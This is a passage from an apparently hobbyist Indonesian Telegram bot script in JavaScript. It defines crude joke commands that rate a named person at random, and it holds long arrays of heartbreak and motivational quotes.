  "https://files.catbox.moe/ii5g4r.mp4", 
  "https://files.catbox.moe/ii5g4r.mp4", 
  "https://files.catbox.moe/ii5g4r.mp4", 
  "https://files.catbox.moe/ii5g4r.mp4", 
  "https://files.catbox.moe/ii5g4r.mp4", 
  "https://files.catbox.moe/ii5g4r.mp4", 
  "https://files.catbox.moe/ii5g4r.mp4", 
  "https://files.catbox.moe/ii5g4r.mp4", 
  "https://files.catbox.moe/ii5g4r.mp4", 
  "https://files.catbox.moe/ii5g4r.mp4", 
  "https://files.catbox.moe/ii5g4r.mp4", 
  "https://files.catbox.moe/ii5g4r.mp4", 
  "https://files.catbox.moe/ii5g4r.mp4", 
  "https://files.catbox.moe/ii5g4r.mp4", 
  "https://files.catbox.moe/ii5g4r.mp4", 
  "https://files.catbox.moe/ii5g4r.mp40" 
  ];
  
// Fungsi ambil random
function pickRandom(list) {
  return list[Math.floor(Math.random() * list.length)];
}

// Command /cekkontol
bot.onText(/^\/cekkontol(?:\s+(.+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const q = match[1];

  if (!q) {
    return bot.sendMessage(chatId, `Ketik nama yang mau di cek.\nContoh:\n/cekkontol Rizky`);
  }

  const khodam = [
    `adaa woy tapi kecil punya nya si ${q}\nahh mana sedap`,
    `gak ada jir aowkwkwk\nwoyy kontol si ${q} gada aowkwk`,
  ];

  const kodam = khodam[Math.floor(Math.random() * khodam.length)];

  const respons = `
°「 *CEK KONTOL* 」°

• *Nama:* ${q}
• *Kontol:* ${kodam}
`;

  bot.sendMessage(chatId, respons, { parse_mode: "Markdown" });
});

// Command /cekganteng
bot.onText(/^\/cekganteng(?:\s+(.+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const name = match[1];

  if (!name) {
    return bot.sendMessage(chatId, "⚠️ NAMA LU MANA??\nContoh:\n/cekganteng Rizky");
  }

  const ganteng = [
    "cuman 10% doang",
    "20% kurang ganteng soal nya",
    "0% karna nggak ganteng",
    "30% mayan gantengg",
    "40% ganteng",
    "50% Otw cari janda😎",
    "60% Orang Ganteng",
    "70% Ganteng bet",
    "80% gantengggg parah",
    "90% Ganteng idaman ciwi ciwi",
    "100% Ganteng Bgt bjirr"
  ];

  const hasil = ganteng[Math.floor(Math.random() * ganteng.length)];
  const teks = `𝗧𝗲𝗿𝗻𝘆𝗮𝘁𝗮 *${name}* ${hasil}`;

  bot.sendMessage(chatId, teks, { parse_mode: "Markdown" });
});

// ====== kata kata =====
const galau = [
    "Gak salah kalo aku lebih berharap sama orang yang lebih pasti tanpa khianati janji-janji",
    "Kalau aku memang tidak sayang sama kamu ngapain aku mikirin kamu. Tapi semuanya kamu yang ngganggap aku gak sayang sama kamu",
    "Jangan iri dan sedih jika kamu tidak memiliki kemampuan seperti yang orang miliki. Yakinlah orang lain juga tidak memiliki kemampuan sepertimu",
    "Hanya kamu yang bisa membuat langkahku terhenti, sambil berkata dalam hati mana bisa aku meninggalkanmu",
    "Tetap tersenyum walaluku masih dibuat menunggu dan rindu olehmu, tapi itu demi kamu",
    "Tak semudah itu melupakanmu",
    "Secuek-cueknya kamu ke aku, aku tetap sayang sama kamu karena kamu telah menerima aku apa adanya",
    "Aku sangat bahagia jika kamu bahagia didekatku, bukan didekatnya",
    "Jadilah diri sendiri, jangan mengikuti orang lain, tetapi tidak sanggup untuk menjalaninya",
    "Cobalah terdiam sejenak untuk memikirkan bagaimana caranya agar kita dapat menyelesaikan masalah ini bersama-sama",
    "Bisakah kita tidak bermusuhan setelah berpisah, aku mau kita seperti dulu sebelum kita jadian yang seru-seruan bareng, bercanda dan yang lainnya",
    "Aku ingin kamu bisa langgeng sama aku dan yang aku harapkan kamu bisa jadi jodohku",
    "Cinta tak bisa dijelaskan dengan kata-kata saja, karena cinta hanya mampu dirasakan oleh hati",
    "Masalah terbesar dalam diri seseorang adalah tak sanggup melawan rasa takutnya",
    "Selamat pagi buat orang yang aku sayang dan orang yang membenciku, semoga hari ini hari yang lebih baik daripada hari kemarin buat aku dan kamu",
    "Jangan menyerah dengan keadaanmu sekarang, optimis karena optimislah yang bikin kita kuat",
    "Kepada pria yang selalu ada di doaku aku mencintaimu dengan tulus apa adanya",
    "Tolong jangan pergi saat aku sudah sangat sayang padamu",
    "Coba kamu yang berada diposisiku, lalu kamu ditinggalin gitu aja sama orang yang lo sayang banget",
    "Aku takut kamu kenapa-napa, aku panik jika kamu sakit, itu karena aku cinta dan sayang padamu",
    "Sakit itu ketika cinta yang aku beri tidak kamu hargai",
    "Kamu tiba-tiba berubah tanpa sebab tapi jika memang ada sebabnya kamu berubah tolong katakan biar saya perbaiki kesalahan itu",
    "Karenamu aku jadi tau cinta yang sesungguhnya",
    "Senyum manismu sangatlah indah, jadi janganlah sampai kamu bersedih",
    "Berawal dari kenalan, bercanda bareng, ejek-ejekan kemudian berubah menjadi suka, nyaman dan akhirnya saling sayang dan mencintai",
    "Tersenyumlah pada orang yang telah menyakitimu agar sia tau arti kesabaran yang luar biasa",
    "Aku akan ingat kenangan pahit itu dan aku akan jadikan pelajaran untuk masa depan yang manis",
    "Kalau memang tak sanggup menepati janjimu itu setidaknya kamu ingat dan usahakan jagan membiarkan janjimu itu sampai kau lupa",
    "Hanya bisa diam dan berfikir Kenapa orang yang setia dan baik ditinggalin yang nakal dikejar-kejar giliran ditinggalin bilangnya laki-laki itu semuanya sama",
    "Walaupun hanya sesaat saja kau membahagiakanku tapi rasa bahagia yang dia tidak cepat dilupakan",
    "Aku tak menyangka kamu pergi dan melupakan ku begitu cepat",
    "Jomblo gak usah diam rumah mumpung malam minggu ya keluar jalan lah kan jomblo bebas bisa dekat sama siapapun pacar orang mantan sahabat bahkan sendiri atau bareng setan pun bisa",
    "Kamu adalah teman yang selalu di sampingku dalam keadaan senang maupun susah Terimakasih kamu selalu ada di sampingku",
    "Aku tak tahu sebenarnya di dalam hatimu itu ada aku atau dia",
    "Tak mudah melupakanmu karena aku sangat mencintaimu meskipun engkau telah menyakiti aku berkali-kali",
    "Hidup ini hanya sebentar jadi lepaskan saja mereka yang menyakitimu Sayangi Mereka yang peduli padamu dan perjuangan mereka yang berarti bagimu",
    "Tolong jangan pergi meninggalkanku aku masih sangat mencintai dan menyayangimu",
    "Saya mencintaimu dan menyayangimu jadi tolong jangan engkau pergi dan meninggalkan ku sendiri",
    "Saya sudah cukup tahu bagaimana sifatmu itu kamu hanya dapat memberikan harapan palsu kepadaku",
    "Aku berusaha mendapatkan cinta darimu tetapi Kamunya nggak peka",
    "Aku bangkit dari jatuh ku setelah kau jatuhkan aku dan aku akan memulainya lagi dari awal Tanpamu",
    "Mungkin sekarang jodohku masih jauh dan belum bisa aku dapat tapi aku yakin jodoh itu Takkan kemana-mana dan akan ku dapatkan",
    "Datang aja dulu baru menghina orang lain kalau memang dirimu dan lebih baik dari yang kau hina",
    "Membelakanginya mungkin lebih baik daripada melihatnya selingkuh didepan mata sendiri",
    "Bisakah hatimu seperti angsa yang hanya setia pada satu orang saja",
    "Aku berdiri disini sendiri menunggu kehadiran dirimu",
    "Aku hanya tersenyum padamu setelah kau menyakitiku agar kamu tahu arti kesabaran",
    "Maaf aku lupa ternyata aku bukan siapa-siapa",
    "Untuk memegang janjimu itu harus ada buktinya jangan sampai hanya janji palsu",
    "Aku tidak bisa selamanya menunggu dan kini aku menjadi ragu Apakah kamu masih mencintaiku",
    "Jangan buat aku terlalu berharap jika kamu tidak menginginkanku",
    "Lebih baik sendiri daripada berdua tapi tanpa kepastian",
    "Pergi bukan berarti berhenti mencintai tapi kecewa dan lelah karena harus berjuang sendiri",
    "Bukannya aku tidak ingin menjadi pacarmu Aku hanya ingin dipersatukan dengan cara yang benar",
    "Akan ada saatnya kok aku akan benar-benar lupa dan tidak memikirkan mu lagi",
    "Kenapa harus jatuh cinta kepada orang yang tak bisa dimiliki",
    "Jujur aku juga memiliki perasaan terhadapmu dan tidak bisa menolakmu tapi aku juga takut untuk mencintaimu",
    "Maafkan aku sayang tidak bisa menjadi seperti yang kamu mau",
    "Jangan memberi perhatian lebih seperti itu cukup biasa saja tanpa perlu menimbulkan rasa",
    "Aku bukan mencari yang sempurna tapi yang terbaik untukku",
    "Sendiri itu tenang tidak ada pertengkaran kebohongan dan banyak aturan",
    "Cewek strong itu adalah yang sabar dan tetap tersenyum meskipun dalam keadaan terluka",
    "Terima kasih karena kamu aku menjadi lupa tentang masa laluku",
    "Cerita cinta indah tanpa masalah itu hanya di dunia dongeng saja",
    "Kamu tidak akan menemukan apa-apa di masa lalu Yang ada hanyalah penyesalan dan sakit hati",
    "Mikirin orang yang gak pernah mikirin kita itu emang bikin gila",
    "Dari sekian lama menunggu apa yang sudah didapat",
    "Perasaan Bodo gue adalah bisa jatuh cinta sama orang yang sama meski udah disakiti berkali-kali",
    "Yang sendiri adalah yang bersabar menunggu pasangan sejatinya",
    "Aku terlahir sederhana dan ditinggal sudah biasa",
    "Aku sayang kamu tapi aku masih takut untuk mencintaimu",
    "Bisa berbagi suka dan duka bersamamu itu sudah membuatku bahagia",
    "Aku tidak pernah berpikir kamu akan menjadi yang sementara",
    "Jodoh itu bukan seberapa dekat kamu dengannya tapi seberapa yakin kamu dengan Allah",
    "Jangan paksa aku menjadi cewek seperti seleramu",
    "Hanya yang sabar yang mampu melewati semua kekecewaan",
    "Balikan sama kamu itu sama saja bunuh diri dan melukai perasaan ku sendiri",
    "Tak perlu membalas dengan menyakiti biar Karma yang akan urus semua itu",
    "Aku masih ingat kamu tapi perasaanku sudah tidak sakit seperti dulu",
    "Punya kalimat sendiri & mau ditambahin? chat *.owner*"
];

// Command: /quotesgalau
bot.onText(/^\/quotesgalau$/, (msg) => {
    const chatId = msg.chat.id;

    function pickRandom(list) {
        return list[Math.floor(Math.random() * list.length)];
    }

    const bacotan = pickRandom(galau);
    bot.sendMessage(chatId, bacotan);
});

const motivasi = [
 "ᴊᴀɴɢᴀɴ ʙɪᴄᴀʀᴀ, ʙᴇʀᴛɪɴᴅᴀᴋ ꜱᴀᴊᴀ. ᴊᴀɴɢᴀɴ ᴋᴀᴛᴀᴋᴀɴ, ᴛᴜɴᴊᴜᴋᴋᴀɴ ꜱᴀᴊᴀ. ᴊᴀɴɢᴀɴ ᴊᴀɴᴊɪ, ʙᴜᴋᴛɪᴋᴀɴ ꜱᴀᴊᴀ.",
"ᴊᴀɴɢᴀɴ ᴘᴇʀɴᴀʜ ʙᴇʀʜᴇɴᴛɪ ᴍᴇʟᴀᴋᴜᴋᴀɴ ʏᴀɴɢ ᴛᴇʀʙᴀɪᴋ ʜᴀɴʏᴀ ᴋᴀʀᴇɴᴀ ꜱᴇꜱᴇᴏʀᴀɴɢ ᴛɪᴅᴀᴋ ᴍᴇᴍʙᴇʀɪ ᴀɴᴅᴀ ᴘᴇɴɢʜᴀʀɢᴀᴀɴ.",
"ʙᴇᴋᴇʀᴊᴀ ꜱᴀᴀᴛ ᴍᴇʀᴇᴋᴀ ᴛɪᴅᴜʀ. ʙᴇʟᴀᴊᴀʀ ꜱᴀᴀᴛ ᴍᴇʀᴇᴋᴀ ʙᴇʀᴘᴇꜱᴛᴀ. ʜᴇᴍᴀᴛ ꜱᴇᴍᴇɴᴛᴀʀᴀ ᴍᴇʀᴇᴋᴀ ᴍᴇɴɢʜᴀʙɪꜱᴋᴀɴ. ʜɪᴅᴜᴘʟᴀʜ ꜱᴇᴘᴇʀᴛɪ ᴍɪᴍᴘɪ ᴍᴇʀᴇᴋᴀ.",
"ᴋᴜɴᴄɪ ꜱᴜᴋꜱᴇꜱ ᴀᴅᴀʟᴀʜ ᴍᴇᴍᴜꜱᴀᴛᴋᴀɴ ᴘɪᴋɪʀᴀɴ ꜱᴀᴅᴀʀ ᴋɪᴛᴀ ᴘᴀᴅᴀ ʜᴀʟ-ʜᴀʟ ʏᴀɴɢ ᴋɪᴛᴀ ɪɴɢɪɴᴋᴀɴ, ʙᴜᴋᴀɴ ʜᴀʟ-ʜᴀʟ ʏᴀɴɢ ᴋɪᴛᴀ ᴛᴀᴋᴜᴛɪ.",
"ᴊᴀɴɢᴀɴ ᴛᴀᴋᴜᴛ ɢᴀɢᴀʟ. ᴋᴇᴛᴀᴋᴜᴛᴀɴ ʙᴇʀᴀᴅᴀ ᴅɪ ᴛᴇᴍᴘᴀᴛ ʏᴀɴɢ ꜱᴀᴍᴀ ᴛᴀʜᴜɴ ᴅᴇᴘᴀɴ ꜱᴇᴘᴇʀᴛɪ ᴀɴᴅᴀ ꜱᴀᴀᴛ ɪɴɪ.",
"ᴊɪᴋᴀ ᴋɪᴛᴀ ᴛᴇʀᴜꜱ ᴍᴇʟᴀᴋᴜᴋᴀɴ ᴀᴘᴀ ʏᴀɴɢ ᴋɪᴛᴀ ʟᴀᴋᴜᴋᴀɴ, ᴋɪᴛᴀ ᴀᴋᴀɴ ᴛᴇʀᴜꜱ ᴍᴇɴᴅᴀᴘᴀᴛᴋᴀɴ ᴀᴘᴀ ʏᴀɴɢ ᴋɪᴛᴀ ᴅᴀᴘᴀᴛᴋᴀɴ.",
"ᴊɪᴋᴀ ᴀɴᴅᴀ ᴛɪᴅᴀᴋ ᴅᴀᴘᴀᴛ ᴍᴇɴɢᴀᴛᴀꜱɪ ꜱᴛʀᴇꜱ, ᴀɴᴅᴀ ᴛɪᴅᴀᴋ ᴀᴋᴀɴ ᴍᴇɴɢᴇʟᴏʟᴀ ᴋᴇꜱᴜᴋꜱᴇꜱᴀɴ.",
"ʙᴇʀꜱɪᴋᴀᴘ ᴋᴇʀᴀꜱ ᴋᴇᴘᴀʟᴀ ᴛᴇɴᴛᴀɴɢ ᴛᴜᴊᴜᴀɴ ᴀɴᴅᴀ ᴅᴀɴ ꜰʟᴇᴋꜱɪʙᴇʟ ᴛᴇɴᴛᴀɴɢ ᴍᴇᴛᴏᴅᴇ ᴀɴᴅᴀ.",
"ᴋᴇʀᴊᴀ ᴋᴇʀᴀꜱ ᴍᴇɴɢᴀʟᴀʜᴋᴀɴ ʙᴀᴋᴀᴛ ᴋᴇᴛɪᴋᴀ ʙᴀᴋᴀᴛ ᴛɪᴅᴀᴋ ʙᴇᴋᴇʀᴊᴀ ᴋᴇʀᴀꜱ.",
"ɪɴɢᴀᴛʟᴀʜ ʙᴀʜᴡᴀ ᴘᴇʟᴀᴊᴀʀᴀɴ ᴛᴇʀʙᴇꜱᴀʀ ᴅᴀʟᴀᴍ ʜɪᴅᴜᴘ ʙɪᴀꜱᴀɴʏᴀ ᴅɪᴘᴇʟᴀᴊᴀʀɪ ᴅᴀʀɪ ꜱᴀᴀᴛ-ꜱᴀᴀᴛ ᴛᴇʀʙᴜʀᴜᴋ ᴅᴀɴ ᴅᴀʀɪ ᴋᴇꜱᴀʟᴀʜᴀɴ ᴛᴇʀʙᴜʀᴜᴋ.",
"ʜɪᴅᴜᴘ ʙᴜᴋᴀɴ ᴛᴇɴᴛᴀɴɢ ᴍᴇɴᴜɴɢɢᴜ ʙᴀᴅᴀɪ ʙᴇʀʟᴀʟᴜ, ᴛᴇᴛᴀᴘɪ ʙᴇʟᴀᴊᴀʀ ᴍᴇɴᴀʀɪ ᴅɪ ᴛᴇɴɢᴀʜ ʜᴜᴊᴀɴ.",
"ᴊɪᴋᴀ ʀᴇɴᴄᴀɴᴀɴʏᴀ ᴛɪᴅᴀᴋ ʙᴇʀʜᴀꜱɪʟ, ᴜʙᴀʜ ʀᴇɴᴄᴀɴᴀɴʏᴀ ʙᴜᴋᴀɴ ᴛᴜᴊᴜᴀɴɴʏᴀ.",
"ᴊᴀɴɢᴀɴ ᴛᴀᴋᴜᴛ ᴋᴀʟᴀᴜ ʜɪᴅᴜᴘᴍᴜ ᴀᴋᴀɴ ʙᴇʀᴀᴋʜɪʀ; ᴛᴀᴋᴜᴛʟᴀʜ ᴋᴀʟᴀᴜ ʜɪᴅᴜᴘᴍᴜ ᴛᴀᴋ ᴘᴇʀɴᴀʜ ᴅɪᴍᴜʟᴀɪ.",
"ᴏʀᴀɴɢ ʏᴀɴɢ ʙᴇɴᴀʀ-ʙᴇɴᴀʀ ʜᴇʙᴀᴛ ᴀᴅᴀʟᴀʜ ᴏʀᴀɴɢ ʏᴀɴɢ ᴍᴇᴍʙᴜᴀᴛ ꜱᴇᴛɪᴀᴘ ᴏʀᴀɴɢ ᴍᴇʀᴀꜱᴀ ʜᴇʙᴀᴛ.",
"ᴘᴇɴɢᴀʟᴀᴍᴀɴ ᴀᴅᴀʟᴀʜ ɢᴜʀᴜ ʏᴀɴɢ ʙᴇʀᴀᴛ ᴋᴀʀᴇɴᴀ ᴅɪᴀ ᴍᴇᴍʙᴇʀɪᴋᴀɴ ᴛᴇꜱ ᴛᴇʀʟᴇʙɪʜ ᴅᴀʜᴜʟᴜ, ᴋᴇᴍᴜᴅɪᴀɴ ᴘᴇʟᴀᴊᴀʀᴀɴɴʏᴀ.",
"ᴍᴇɴɢᴇᴛᴀʜᴜɪ ꜱᴇʙᴇʀᴀᴘᴀ ʙᴀɴʏᴀᴋ ʏᴀɴɢ ᴘᴇʀʟᴜ ᴅɪᴋᴇᴛᴀʜᴜɪ ᴀᴅᴀʟᴀʜ ᴀᴡᴀʟ ᴅᴀʀɪ ʙᴇʟᴀᴊᴀʀ ᴜɴᴛᴜᴋ ʜɪᴅᴜᴘ.",
"ꜱᴜᴋꜱᴇꜱ ʙᴜᴋᴀɴʟᴀʜ ᴀᴋʜɪʀ, ᴋᴇɢᴀɢᴀʟᴀɴ ᴛɪᴅᴀᴋ ꜰᴀᴛᴀʟ. ʏᴀɴɢ ᴛᴇʀᴘᴇɴᴛɪɴɢ ᴀᴅᴀʟᴀʜ ᴋᴇʙᴇʀᴀɴɪᴀɴ ᴜɴᴛᴜᴋ ᴍᴇʟᴀɴᴊᴜᴛᴋᴀɴ.",
"ʟᴇʙɪʜ ʙᴀɪᴋ ɢᴀɢᴀʟ ᴅᴀʟᴀᴍ ᴏʀɪꜱɪɴᴀʟɪᴛᴀꜱ ᴅᴀʀɪᴘᴀᴅᴀ ʙᴇʀʜᴀꜱɪʟ ᴍᴇɴɪʀᴜ.",
"ʙᴇʀᴀɴɪ ʙᴇʀᴍɪᴍᴘɪ, ᴛᴀᴘɪ ʏᴀɴɢ ʟᴇʙɪʜ ᴘᴇɴᴛɪɴɢ, ʙᴇʀᴀɴɪ ᴍᴇʟᴀᴋᴜᴋᴀɴ ᴛɪɴᴅᴀᴋᴀɴ ᴅɪ ʙᴀʟɪᴋ ɪᴍᴘɪᴀɴᴍᴜ.",
"ᴛᴇᴛᴀᴘᴋᴀɴ ᴛᴜᴊᴜᴀɴ ᴀɴᴅᴀ ᴛɪɴɢɢɪ-ᴛɪɴɢɢɪ, ᴅᴀɴ ᴊᴀɴɢᴀɴ ʙᴇʀʜᴇɴᴛɪ ꜱᴀᴍᴘᴀɪ ᴀɴᴅᴀ ᴍᴇɴᴄᴀᴘᴀɪɴʏᴀ.",
"ᴋᴇᴍʙᴀɴɢᴋᴀɴ ᴋᴇꜱᴜᴋꜱᴇꜱᴀɴ ᴅᴀʀɪ ᴋᴇɢᴀɢᴀʟᴀɴ. ᴋᴇᴘᴜᴛᴜꜱᴀꜱᴀᴀɴ ᴅᴀɴ ᴋᴇɢᴀɢᴀʟᴀɴ ᴀᴅᴀʟᴀʜ ᴅᴜᴀ ʙᴀᴛᴜ ʟᴏɴᴄᴀᴛᴀɴ ᴘᴀʟɪɴɢ ᴘᴀꜱᴛɪ ᴍᴇɴᴜᴊᴜ ꜱᴜᴋꜱᴇꜱ.",
"ᴊᴇɴɪᴜꜱ ᴀᴅᴀʟᴀʜ ꜱᴀᴛᴜ ᴘᴇʀꜱᴇɴ ɪɴꜱᴘɪʀᴀꜱɪ ᴅᴀɴ ꜱᴇᴍʙɪʟᴀɴ ᴘᴜʟᴜʜ ꜱᴇᴍʙɪʟᴀɴ ᴘᴇʀꜱᴇɴ ᴋᴇʀɪɴɢᴀᴛ.",
"ꜱᴜᴋꜱᴇꜱ ᴀᴅᴀʟᴀʜ ᴛᴇᴍᴘᴀᴛ ᴘᴇʀꜱɪᴀᴘᴀɴ ᴅᴀɴ ᴋᴇꜱᴇᴍᴘᴀᴛᴀɴ ʙᴇʀᴛᴇᴍᴜ.",
"ᴋᴇᴛᴇᴋᴜɴᴀɴ ɢᴀɢᴀʟ 19 ᴋᴀʟɪ ᴅᴀɴ ʙᴇʀʜᴀꜱɪʟ ᴘᴀᴅᴀ ᴋᴇꜱᴇᴍᴘᴀᴛᴀᴍ ʏᴀɴɢ ᴋᴇ-20.",
"ᴊᴀʟᴀɴ ᴍᴇɴᴜᴊᴜ ꜱᴜᴋꜱᴇꜱ ᴅᴀɴ ᴊᴀʟᴀɴ ᴍᴇɴᴜᴊᴜ ᴋᴇɢᴀɢᴀʟᴀɴ ʜᴀᴍᴘɪʀ ᴘᴇʀꜱɪꜱ ꜱᴀᴍᴀ.",
"ꜱᴜᴋꜱᴇꜱ ʙɪᴀꜱᴀɴʏᴀ ᴅᴀᴛᴀɴɢ ᴋᴇᴘᴀᴅᴀ ᴍᴇʀᴇᴋᴀ ʏᴀɴɢ ᴛᴇʀʟᴀʟᴜ ꜱɪʙᴜᴋ ᴍᴇɴᴄᴀʀɪɴʏᴀ.",
"ᴊᴀɴɢᴀɴ ᴛᴜɴᴅᴀ ᴘᴇᴋᴇʀᴊᴀᴀɴᴍᴜ ꜱᴀᴍᴘᴀɪ ʙᴇꜱᴏᴋ, ꜱᴇᴍᴇɴᴛᴀʀᴀ ᴋᴀᴜ ʙɪꜱᴀ ᴍᴇɴɢᴇʀᴊᴀᴋᴀɴɴʏᴀ ʜᴀʀɪ ɪɴɪ.",
"20 ᴛᴀʜᴜɴ ᴅᴀʀɪ ꜱᴇᴋᴀʀᴀɴɢ, ᴋᴀᴜ ᴍᴜɴɢᴋɪɴ ʟᴇʙɪʜ ᴋᴇᴄᴇᴡᴀ ᴅᴇɴɢᴀɴ ʜᴀʟ-ʜᴀʟ ʏᴀɴɢ ᴛɪᴅᴀᴋ ꜱᴇᴍᴘᴀᴛ ᴋᴀᴜ ʟᴀᴋᴜᴋᴀɴ ᴀʟɪʜ-ᴀʟɪʜ ʏᴀɴɢ ꜱᴜᴅᴀʜ.",
"ᴊᴀɴɢᴀɴ ʜᴀʙɪꜱᴋᴀɴ ᴡᴀᴋᴛᴜᴍᴜ ᴍᴇᴍᴜᴋᴜʟɪ ᴛᴇᴍʙᴏᴋ ᴅᴀɴ ʙᴇʀʜᴀʀᴀᴘ ʙɪꜱᴀ ᴍᴇɴɢᴜʙᴀʜɴʏᴀ ᴍᴇɴᴊᴀᴅɪ ᴘɪɴᴛᴜ.",
"ᴋᴇꜱᴇᴍᴘᴀᴛᴀɴ ɪᴛᴜ ᴍɪʀɪᴘ ꜱᴇᴘᴇʀᴛɪ ᴍᴀᴛᴀʜᴀʀɪ ᴛᴇʀʙɪᴛ. ᴋᴀʟᴀᴜ ᴋᴀᴜ ᴍᴇɴᴜɴɢɢᴜ ᴛᴇʀʟᴀʟᴜ ʟᴀᴍᴀ, ᴋᴀᴜ ʙɪꜱᴀ ᴍᴇʟᴇᴡᴀᴛᴋᴀɴɴʏᴀ.",
"ʜɪᴅᴜᴘ ɪɴɪ ᴛᴇʀᴅɪʀɪ ᴅᴀʀɪ 10 ᴘᴇʀꜱᴇɴ ᴀᴘᴀ ʏᴀɴɢ ᴛᴇʀᴊᴀᴅɪ ᴘᴀᴅᴀᴍᴜ ᴅᴀɴ 90 ᴘᴇʀꜱᴇɴ ʙᴀɢᴀɪᴍᴀɴᴀ ᴄᴀʀᴀᴍᴜ ᴍᴇɴʏɪᴋᴀᴘɪɴʏᴀ.",
"ᴀᴅᴀ ᴛɪɢᴀ ᴄᴀʀᴀ ᴜɴᴛᴜᴋ ᴍᴇɴᴄᴀᴘᴀɪ ᴋᴇꜱᴜᴋꜱᴇꜱᴀɴ ᴛᴇʀᴛɪɴɢɢɪ: ᴄᴀʀᴀ ᴘᴇʀᴛᴀᴍᴀ ᴀᴅᴀʟᴀʜ ʙᴇʀꜱɪᴋᴀᴘ ʙᴀɪᴋ. ᴄᴀʀᴀ ᴋᴇᴅᴜᴀ ᴀᴅᴀʟᴀʜ ʙᴇʀꜱɪᴋᴀᴘ ʙᴀɪᴋ. ᴄᴀʀᴀ ᴋᴇᴛɪɢᴀ ᴀᴅᴀʟᴀʜ ᴍᴇɴᴊᴀᴅɪ ʙᴀɪᴋ.",
"ᴀʟᴀꜱᴀɴ ɴᴏᴍᴏʀ ꜱᴀᴛᴜ ᴏʀᴀɴɢ ɢᴀɢᴀʟ ᴅᴀʟᴀᴍ ʜɪᴅᴜᴘ ᴀᴅᴀʟᴀʜ ᴋᴀʀᴇɴᴀ ᴍᴇʀᴇᴋᴀ ᴍᴇɴᴅᴇɴɢᴀʀᴋᴀɴ ᴛᴇᴍᴀɴ, ᴋᴇʟᴜᴀʀɢᴀ, ᴅᴀɴ ᴛᴇᴛᴀɴɢɢᴀ ᴍᴇʀᴇᴋᴀ.",
"ᴡᴀᴋᴛᴜ ʟᴇʙɪʜ ʙᴇʀʜᴀʀɢᴀ ᴅᴀʀɪᴘᴀᴅᴀ ᴜᴀɴɢ. ᴋᴀᴍᴜ ʙɪꜱᴀ ᴍᴇɴᴅᴀᴘᴀᴛᴋᴀɴ ʟᴇʙɪʜ ʙᴀɴʏᴀᴋ ᴜᴀɴɢ, ᴛᴇᴛᴀᴘɪ ᴋᴀᴍᴜ ᴛɪᴅᴀᴋ ʙɪꜱᴀ ᴍᴇɴᴅᴀᴘᴀᴛᴋᴀɴ ʟᴇʙɪʜ ʙᴀɴʏᴀᴋ ᴡᴀᴋᴛᴜ.",
"ᴘᴇɴᴇᴛᴀᴘᴀɴ ᴛᴜᴊᴜᴀɴ ᴀᴅᴀʟᴀʜ ʀᴀʜᴀꜱɪᴀ ᴍᴀꜱᴀ ᴅᴇᴘᴀɴ ʏᴀɴɢ ᴍᴇɴᴀʀɪᴋ.",
"ꜱᴀᴀᴛ ᴋɪᴛᴀ ʙᴇʀᴜꜱᴀʜᴀ ᴜɴᴛᴜᴋ ᴍᴇɴᴊᴀᴅɪ ʟᴇʙɪʜ ʙᴀɪᴋ ᴅᴀʀɪ ᴋɪᴛᴀ, ꜱᴇɢᴀʟᴀ ꜱᴇꜱᴜᴀᴛᴜ ᴅɪ ꜱᴇᴋɪᴛᴀʀ ᴋɪᴛᴀ ᴊᴜɢᴀ ᴍᴇɴᴊᴀᴅɪ ʟᴇʙɪʜ ʙᴀɪᴋ.",
"ᴘᴇʀᴛᴜᴍʙᴜʜᴀɴ ᴅɪᴍᴜʟᴀɪ ᴋᴇᴛɪᴋᴀ ᴋɪᴛᴀ ᴍᴜʟᴀɪ ᴍᴇɴᴇʀɪᴍᴀ ᴋᴇʟᴇᴍᴀʜᴀɴ ᴋɪᴛᴀ ꜱᴇɴᴅɪʀɪ.",
"ᴊᴀɴɢᴀɴʟᴀʜ ᴘᴇʀɴᴀʜ ᴍᴇɴʏᴇʀᴀʜ ᴋᴇᴛɪᴋᴀ ᴀɴᴅᴀ ᴍᴀꜱɪʜ ᴍᴀᴍᴘᴜ ʙᴇʀᴜꜱᴀʜᴀ ʟᴀɢɪ. ᴛɪᴅᴀᴋ ᴀᴅᴀ ᴋᴀᴛᴀ ʙᴇʀᴀᴋʜɪʀ ꜱᴀᴍᴘᴀɪ ᴀɴᴅᴀ ʙᴇʀʜᴇɴᴛɪ ᴍᴇɴᴄᴏʙᴀ.",
"ᴋᴇᴍᴀᴜᴀɴ ᴀᴅᴀʟᴀʜ ᴋᴜɴᴄɪ ꜱᴜᴋꜱᴇꜱ. ᴏʀᴀɴɢ-ᴏʀᴀɴɢ ꜱᴜᴋꜱᴇꜱ, ʙᴇʀᴜꜱᴀʜᴀ ᴋᴇʀᴀꜱ ᴀᴘᴀ ᴘᴜɴ ʏᴀɴɢ ᴍᴇʀᴇᴋᴀ ʀᴀꜱᴀᴋᴀɴ ᴅᴇɴɢᴀɴ ᴍᴇɴᴇʀᴀᴘᴋᴀɴ ᴋᴇɪɴɢɪɴᴀɴ ᴍᴇʀᴇᴋᴀ ᴜɴᴛᴜᴋ ᴍᴇɴɢᴀᴛᴀꜱɪ ꜱɪᴋᴀᴘ ᴀᴘᴀᴛɪꜱ, ᴋᴇʀᴀɢᴜᴀɴ ᴀᴛᴀᴜ ᴋᴇᴛᴀᴋᴜᴛᴀɴ.",
"ᴊᴀɴɢᴀɴʟᴀʜ ᴘᴇʀɴᴀʜ ᴍᴇɴʏᴇʀᴀʜ ᴋᴇᴛɪᴋᴀ ᴀɴᴅᴀ ᴍᴀꜱɪʜ ᴍᴀᴍᴘᴜ ʙᴇʀᴜꜱᴀʜᴀ ʟᴀɢɪ. ᴛɪᴅᴀᴋ ᴀᴅᴀ ᴋᴀᴛᴀ ʙᴇʀᴀᴋʜɪʀ ꜱᴀᴍᴘᴀɪ ᴀɴᴅᴀ ʙᴇʀʜᴇɴᴛɪ ᴍᴇɴᴄᴏʙᴀ.",
